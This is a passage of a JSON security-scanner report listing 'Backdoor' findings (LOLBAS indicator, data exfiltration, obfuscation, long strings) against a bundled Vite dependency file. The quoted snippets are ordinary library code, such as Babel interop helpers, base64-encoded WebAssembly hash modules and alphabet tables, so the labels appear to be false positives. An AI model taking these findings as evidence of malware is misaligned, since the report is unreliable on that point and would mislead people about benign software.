                      "text": "\t      if (name !== nameRaw) {\n\t        raws.value = \"/\" + nameRaw + \"/\";\n\t      }\n\t      var node = new _combinator[\"default\"]({\n\t        value: \"/\" + name + \"/\",\n\t        source: getSource(this.currToken[_tokenize.FIELDS.START_LINE], this.currToken[_tokenize.FIELDS.START_COL], this.tokens[this.position + 2][_tokenize.FIELDS.END_LINE], this.tokens[this.position + 2][_tokenize.FIELDS.END_COL]),\n\t        sourceIndex: this.currToken[_tokenize.FIELDS.START_POS],\n",
                      "markdown": "`\t      if (name !== nameRaw) {\n\t        raws.value = \"/\" + nameRaw + \"/\";\n\t      }\n\t      var node = new _combinator[\"default\"]({\n\t        value: \"/\" + name + \"/\",\n\t        source: getSource(this.currToken[_tokenize.FIELDS.START_LINE], this.currToken[_tokenize.FIELDS.START_COL], this.tokens[this.position + 2][_tokenize.FIELDS.END_LINE], this.tokens[this.position + 2][_tokenize.FIELDS.END_COL]),\n\t        sourceIndex: this.currToken[_tokenize.FIELDS.START_POS],\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4406,
                  "startColumn": 8,
                  "endLine": 4406,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\t      return this.expected('closing square bracket', this.currToken[_tokenize.FIELDS.START_POS]);\n\t    }\n\t    var len = attr.length;\n\t    var node = {\n\t      source: getSource(startingToken[1], startingToken[2], this.currToken[3], this.currToken[4]),\n\t      sourceIndex: startingToken[_tokenize.FIELDS.START_POS]\n\t    };\n",
                    "rendered": {
                      "text": "\t      return this.expected('closing square bracket', this.currToken[_tokenize.FIELDS.START_POS]);\n\t    }\n\t    var len = attr.length;\n\t    var node = {\n\t      source: getSource(startingToken[1], startingToken[2], this.currToken[3], this.currToken[4]),\n\t      sourceIndex: startingToken[_tokenize.FIELDS.START_POS]\n\t    };\n",
                      "markdown": "`\t      return this.expected('closing square bracket', this.currToken[_tokenize.FIELDS.START_POS]);\n\t    }\n\t    var len = attr.length;\n\t    var node = {\n\t      source: getSource(startingToken[1], startingToken[2], this.currToken[3], this.currToken[4]),\n\t      sourceIndex: startingToken[_tokenize.FIELDS.START_POS]\n\t    };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 3396,
                  "startColumn": 3,
                  "endLine": 3396,
                  "endColumn": 9,
                  "snippet": {
                    "text": " * For Node.js, simply re-export the core `util.deprecate` function.\n */\n\nvar node = require$$0$2.deprecate;\n\n(function (exports) {\n\n",
                    "rendered": {
                      "text": " * For Node.js, simply re-export the core `util.deprecate` function.\n */\n\nvar node = require$$0$2.deprecate;\n\n(function (exports) {\n\n",
                      "markdown": "` * For Node.js, simply re-export the core `util.deprecate` function.\n */\n\nvar node = require$$0$2.deprecate;\n\n(function (exports) {\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 2670,
                  "startColumn": 10,
                  "endLine": 2670,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\t  };\n\t  _proto.removeAll = function removeAll() {\n\t    for (var _iterator = _createForOfIteratorHelperLoose(this.nodes), _step; !(_step = _iterator()).done;) {\n\t      var node = _step.value;\n\t      node.parent = undefined;\n\t    }\n\t    this.nodes = [];\n",
                    "rendered": {
                      "text": "\t  };\n\t  _proto.removeAll = function removeAll() {\n\t    for (var _iterator = _createForOfIteratorHelperLoose(this.nodes), _step; !(_step = _iterator()).done;) {\n\t      var node = _step.value;\n\t      node.parent = undefined;\n\t    }\n\t    this.nodes = [];\n",
                      "markdown": "`\t  };\n\t  _proto.removeAll = function removeAll() {\n\t    for (var _iterator = _createForOfIteratorHelperLoose(this.nodes), _step; !(_step = _iterator()).done;) {\n\t      var node = _step.value;\n\t      node.parent = undefined;\n\t    }\n\t    this.nodes = [];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1784,
                  "startColumn": 6,
                  "endLine": 1784,
                  "endColumn": 12,
                  "snippet": {
                    "text": "IDgP4NCCIaEIgRCj4C8gPCBwAeDQgiGIARC8IHAh4CegPgAg0IEiIQiBEKGjJiw4MCBgwZ8QgSIQoGChIiQoMCAAYNCJ34gBEKw4MCBg4aMmDCEfDcDAEEYIwStIgRC//8DgyAEQoCA/P8Pg0IQhoQiBEL/gYCA8B+DIARCgP6DgIDgP4NCCIaEIgRCj4C8gPCBwAeDQgiGIARC8IHAh4CegPgAg0IEiIQiBEKGjJiw4MCBgwZ8QgSIQoGChIiQoMCAAYNCJ34gBEKw4MCBg4aMmDCEfDcDAAs=\",\n\t    \"base64\"\n\t  )\n\t);\n\t//#endregion\n\n\tmd4_1 = create.bind(null, md4, [], 64, 32);\n\treturn md4_1;\n}\n\nvar BulkUpdateDecorator_1;\nvar hasRequiredBulkUpdateDecorator;\n\nfunction requireBulkUpdateDecorator () {\n\tif (hasRequiredBulkUpdateDecorator) return BulkUpdateDecorator_1;\n\thasRequiredBulkUpdateDecorator = 1;\n\tc",
                    "rendered": {
                      "text": "IDgP4NCCIaEIgRCj4C8gPCBwAeDQgiGIARC8IHAh4CegPgAg0IEiIQiBEKGjJiw4MCBgwZ8QgSIQoGChIiQoMCAAYNCJ34gBEKw4MCBg4aMmDCEfDcDAEEYIwStIgRC//8DgyAEQoCA/P8Pg0IQhoQiBEL/gYCA8B+DIARCgP6DgIDgP4NCCIaEIgRCj4C8gPCBwAeDQgiGIARC8IHAh4CegPgAg0IEiIQiBEKGjJiw4MCBgwZ8QgSIQoGChIiQoMCAAYNCJ34gBEKw4MCBg4aMmDCEfDcDAAs=\",\n\t    \"base64\"\n\t  )\n\t);\n\t//#endregion\n\n\tmd4_1 = create.bind(null, md4, [], 64, 32);\n\treturn md4_1;\n}\n\nvar BulkUpdateDecorator_1;\nvar hasRequiredBulkUpdateDecorator;\n\nfunction requireBulkUpdateDecorator () {\n\tif (hasRequiredBulkUpdateDecorator) return BulkUpdateDecorator_1;\n\thasRequiredBulkUpdateDecorator = 1;\n\tc",
                      "markdown": "`IDgP4NCCIaEIgRCj4C8gPCBwAeDQgiGIARC8IHAh4CegPgAg0IEiIQiBEKGjJiw4MCBgwZ8QgSIQoGChIiQoMCAAYNCJ34gBEKw4MCBg4aMmDCEfDcDAEEYIwStIgRC//8DgyAEQoCA/P8Pg0IQhoQiBEL/gYCA8B+DIARCgP6DgIDgP4NCCIaEIgRCj4C8gPCBwAeDQgiGIARC8IHAh4CegPgAg0IEiIQiBEKGjJiw4MCBgwZ8QgSIQoGChIiQoMCAAYNCJ34gBEKw4MCBg4aMmDCEfDcDAAs=\",\n\t    \"base64\"\n\t  )\n\t);\n\t//#endregion\n\n\tmd4_1 = create.bind(null, md4, [], 64, 32);\n\treturn md4_1;\n}\n\nvar BulkUpdateDecorator_1;\nvar hasRequiredBulkUpdateDecorator;\n\nfunction requireBulkUpdateDecorator () {\n\tif (hasRequiredBulkUpdateDecorator) return BulkUpdateDecorator_1;\n\thasRequiredBulkUpdateDecorator = 1;\n\tc`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1683,
                  "startColumn": 6,
                  "endLine": 1683,
                  "endColumn": 12,
                  "snippet": {
                    "text": "o+AvIDwgcAHg0IIhiADQvCBwIeAnoD4AINCBIiEIgNChoyYsODAgYMGfEIEiEKBgoSIkKDAgAGDQid+IANCsODAgYOGjJgwhHw3AwBBCCACQv////8PgyICQv//A4NCIIYgAkKAgPz/D4NCEIiEIgJC/4GAgPAfg0IQhiACQoD+g4CA4D+DQgiIhCICQo+AvIDwgcAHg0IIhiACQvCBwIeAnoD4AINCBIiEIgJChoyYsODAgYMGfEIEiEKBgoSIkKDAgAGDQid+IAJCsODAgYOGjJgwhHw3AwAL\",\n\t    \"base64\"\n\t  )\n\t);\n\t//#endregion\n\n\txxhash64_1 = create.bind(null, xxhash64, [], 32, 16);\n\treturn xxhash64_1;\n}\n\nvar BatchedHash_1;\nvar hasRequiredBatchedHash;\n\nfunction requireBatchedHash () {\n\tif (hasRequiredBatchedHash) return BatchedHash_1;\n\thasRequiredBatchedHash = 1;\n\tconst MAX_SHORT_STRING = requireWa",
                    "rendered": {
                      "text": "o+AvIDwgcAHg0IIhiADQvCBwIeAnoD4AINCBIiEIgNChoyYsODAgYMGfEIEiEKBgoSIkKDAgAGDQid+IANCsODAgYOGjJgwhHw3AwBBCCACQv////8PgyICQv//A4NCIIYgAkKAgPz/D4NCEIiEIgJC/4GAgPAfg0IQhiACQoD+g4CA4D+DQgiIhCICQo+AvIDwgcAHg0IIhiACQvCBwIeAnoD4AINCBIiEIgJChoyYsODAgYMGfEIEiEKBgoSIkKDAgAGDQid+IAJCsODAgYOGjJgwhHw3AwAL\",\n\t    \"base64\"\n\t  )\n\t);\n\t//#endregion\n\n\txxhash64_1 = create.bind(null, xxhash64, [], 32, 16);\n\treturn xxhash64_1;\n}\n\nvar BatchedHash_1;\nvar hasRequiredBatchedHash;\n\nfunction requireBatchedHash () {\n\tif (hasRequiredBatchedHash) return BatchedHash_1;\n\thasRequiredBatchedHash = 1;\n\tconst MAX_SHORT_STRING = requireWa",
                      "markdown": "`o+AvIDwgcAHg0IIhiADQvCBwIeAnoD4AINCBIiEIgNChoyYsODAgYMGfEIEiEKBgoSIkKDAgAGDQid+IANCsODAgYOGjJgwhHw3AwBBCCACQv////8PgyICQv//A4NCIIYgAkKAgPz/D4NCEIiEIgJC/4GAgPAfg0IQhiACQoD+g4CA4D+DQgiIhCICQo+AvIDwgcAHg0IIhiACQvCBwIeAnoD4AINCBIiEIgJChoyYsODAgYMGfEIEiEKBgoSIkKDAgAGDQid+IAJCsODAgYOGjJgwhHw3AwAL\",\n\t    \"base64\"\n\t  )\n\t);\n\t//#endregion\n\n\txxhash64_1 = create.bind(null, xxhash64, [], 32, 16);\n\treturn xxhash64_1;\n}\n\nvar BatchedHash_1;\nvar hasRequiredBatchedHash;\n\nfunction requireBatchedHash () {\n\tif (hasRequiredBatchedHash) return BatchedHash_1;\n\thasRequiredBatchedHash = 1;\n\tconst MAX_SHORT_STRING = requireWa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1916,
                  "startColumn": 6,
                  "endLine": 1916,
                  "endColumn": 70,
                  "snippet": {
                    "text": "  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n};\n\n",
                    "rendered": {
                      "text": "  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n};\n\n",
                      "markdown": "`  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n};\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1915,
                  "startColumn": 6,
                  "endLine": 1915,
                  "endColumn": 66,
                  "snippet": {
                    "text": "  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n};\n",
                    "rendered": {
                      "text": "  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n};\n",
                      "markdown": "`  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n};\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1914,
                  "startColumn": 6,
                  "endLine": 1914,
                  "endColumn": 60,
                  "snippet": {
                    "text": "  32: \"123456789abcdefghjkmnpqrstuvwxyz\", // no 0lio\n  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n",
                    "rendered": {
                      "text": "  32: \"123456789abcdefghjkmnpqrstuvwxyz\", // no 0lio\n  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n",
                      "markdown": "`  32: \"123456789abcdefghjkmnpqrstuvwxyz\", // no 0lio\n  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  64: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\",\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1913,
                  "startColumn": 6,
                  "endLine": 1913,
                  "endColumn": 57,
                  "snippet": {
                    "text": "  26: \"abcdefghijklmnopqrstuvwxyz\",\n  32: \"123456789abcdefghjkmnpqrstuvwxyz\", // no 0lio\n  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n",
                    "rendered": {
                      "text": "  26: \"abcdefghijklmnopqrstuvwxyz\",\n  32: \"123456789abcdefghjkmnpqrstuvwxyz\", // no 0lio\n  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n",
                      "markdown": "`  26: \"abcdefghijklmnopqrstuvwxyz\",\n  32: \"123456789abcdefghjkmnpqrstuvwxyz\", // no 0lio\n  36: \"0123456789abcdefghijklmnopqrstuvwxyz\",\n  49: \"abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no lIO\n  52: \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n  58: \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\", // no 0lIO\n  62: \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 5607,
                  "startColumn": 296,
                  "endLine": 5607,
                  "endColumn": 301,
                  "snippet": {
                    "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                    "rendered": {
                      "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                      "markdown": "`; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4282,
                  "startColumn": 296,
                  "endLine": 4282,
                  "endColumn": 301,
                  "snippet": {
                    "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                    "rendered": {
                      "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                      "markdown": "`; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 4028,
                  "startColumn": 296,
                  "endLine": 4028,
                  "endColumn": 301,
                  "snippet": {
                    "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                    "rendered": {
                      "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                      "markdown": "`; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
